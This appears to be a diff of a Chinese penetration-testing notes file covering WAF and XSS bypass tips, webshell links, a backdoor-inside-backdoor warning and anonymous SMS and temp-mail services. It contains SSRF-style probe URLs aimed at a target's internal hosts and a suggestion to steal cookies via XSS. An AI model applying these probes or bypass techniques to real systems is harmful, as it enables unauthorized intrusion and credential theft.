+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210711024415355.png)
+
+通常你在测试图片上传时会测试以下几种类型的反馈结果
+http://对方内网ip/phpmyadmin
+dict://对方内网ip:3306/info
+ftp://对方内网ip:21
 
 ## 短信轰炸
 
@@ -4288,13 +4428,17 @@ NTP DDOS 的原理
 ## 待重点完善：中间件
 ## 待重点完善：CVE
 ## 待重点完善：WAF绕过
-### WAF安装
+### 基本知识
+**安装**
 阿里云盾：初次安装就有阿里云盾默认开启，可以打开进程管理器后在看到阿里云盾进程。WAF收费版只是有自定义的不同，功能上都差不多。
 宝塔：一般非法网站都会用宝塔一站式搭建，所以一般这类网站就是宝塔防护。绕过难度：难
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707225447286.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 安全狗：安全狗用的人也挺多的，但是他的防护效果不如其他防护软件好。因为历史悠久且免费所以使用的人多。绕过难度：简单
 以下是安全狗默认开启和关闭的选项，按道理来说全部开启网站更安全，但是为了防止正常请求被错误拦截，这里是没有全部开启的
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707231011334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
+### WAF经验
+你在测试你的危险语句时，遭遇waf第一步是不要惊慌，一点一点的测试是因为匹配到了语句中的哪个词组或符号组被拦截了。
 ### 通用
 #### 躲避流量监控
 爬虫伪造
@@ -4354,7 +4498,25 @@ NTP DDOS 的原理
 斜杠也可以作为条件绕过
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709180342299.png)
 
+### xss 绕过
+你在测试时你需要用好F12多监控对方网站到底做了哪些防御。![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710195547722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+单引号括起来后能防止对方的强制加上如h2之类的干扰
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710200005339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
+标签语法替换
+![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071021435745.png)
+
+特殊符号干扰
+/ #
+因爲/在js中代表语句的结束
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710214005267.png)
+
+提交方式更改
+垃圾数据溢出
+加密解密算法
+* 采用此方法你应该查看目标网站可以加解密的方式
+
+结合其他漏洞绕过
 ## 待补充：0day漏洞
 
 ## 代理
@@ -4744,7 +4906,6 @@ https://github.com/LuciferoO/webshell-collector
 
 https://github.com/wangeradd1/myWebShell 一些比较冷门或者特殊的webshell脚本、jar包、war包
 
-https://github.com/0xHJK/caidao 中国菜刀
 
 https://github.com/alintamvanz/1945shell 1945 Shell adalah project webshell backdoor yang rilis setiap tahun (17 Agustus). dan rilis build setiap bulan
 
@@ -5023,14 +5184,13 @@ https://cn.linkedin.com/pub/dir?lastName=&firstName=名&trk=public_profile_peopl
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210520164745383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 #### IP 定位
-
+118.112.11.101
 **IP**
 
 1. 高精度 IP 定位：https://www.opengps.cn/Data/IP/LocHighAcc.aspx
    ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210701231210744.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 
-2. rtbasia （IP 查询）：https://ip.rtbasia.com/
 3. ipplus360 （IP 查询）：http://www.ipplus360.com/ip/
 4. IP 信息查询：https://www.ipip.net/ip.html/
 5. IP 地址查询在线工具：https://tool.lu/ip/
@@ -5596,12 +5756,17 @@ webshell查杀
 **4、文件对比工具**
 关键词：代码对比工具，你会找到很多好用的工具，这里我们推荐两款效果还不错的工具，Beyond Compare 和 WinMerge。
 
-**加粗样式**
 
-## 后门
+## 待补充：后门
 
 后门是个笼统的说法，有网页端有软件端，
 
+### 后门中的后门
+以下这个shell箱子是公开程序。现实中，你在使用网上别人的后门工具去入侵别人时候，一般这个后门软件都加上了后门，且程序加密。当你利用他的软件入侵成功，入侵成功的账号密码将会发送到开发后门软件的人服务器上。如果你想反客为主，就用xss去盗取cookie吧。
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710005549617.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071011142680.png)
+查看一个软件有没有后门，可以直接抓包，但也不乏有一些高端玩家，你无法直接从包里看出对方在干啥。比如下图在调用后门软件就有将你攻破成功后目标网站信息等。
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710124740614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 ### 后门软件
 
 #### 远程控制
@@ -5638,14 +5803,19 @@ webshell查杀
 
 ## 实用工具
 
-### 匿名接码
-
+### 匿名工具
+**手机**
 下面是一些免费的接码平台，可以收取短信验证码
 
-https://www.bfkdim.com/
-https://www.yinsiduanxin.com/
-http://114sim.com/
+国际接码，不过中国的也很多 https://yunjisms.xyz/
+
+大多是其他国家的手机号，你注册有的网站可能无法识别此号码https://www.bfkdim.com/
+https://jiemahao.com
 http://zg.114sim.com/
+
+
+http://114sim.com/
+
 https://yunduanxin.net/
 http://z-sms.com/
 https://zusms.com
@@ -5654,15 +5824,14 @@ www.kakasms.com
 www.materialtools.com
 www.suiyongsuiqi.com
 mianfeijiema.com
-www.becmd.com
 www.114sim.com
 yunduanxin.net
 www.shejiinn.com
 www.zusms.com
-https://jiemahao.com
 
-### 匿名邮箱
-https://www.moakt.com/zh
+
+**邮箱**
+好用 https://www.moakt.com/zh
 https://temp-mail.org/zh/
 https://www.guerrillamail.com/zh/
 http://links.icamtech.com/
@@ -5698,13 +5867,7 @@ https://payloads.online/archivers/2020-02-05/1
 >
 >②伪造反向蜜罐，诱导红队进入并误导溯源并消耗红队的精力
 
-## VPN
 
-不推荐工具。
-**选购**
-选离自己近一点的
-网宽大网不卡
-配置高电脑不卡
 
 ## 匿名代理纯净的渗透环境
 
@@ -6503,7 +6666,8 @@ Books are a great way of deep diving into the theory, “The Web Application Hac
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210701185720116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 https://portswigger.net/research/so-you-want-to-be-a-web-security-researcher
 
-## 待补充，可能删：百度网盘
+
+
 
 乌云漏洞库:https://wooyun.x10sec.org/
 hackone报告：https://pan.baidu.com/s/1jPUSuoERSIDw2zCKZ0xTjA 提取码:2klt
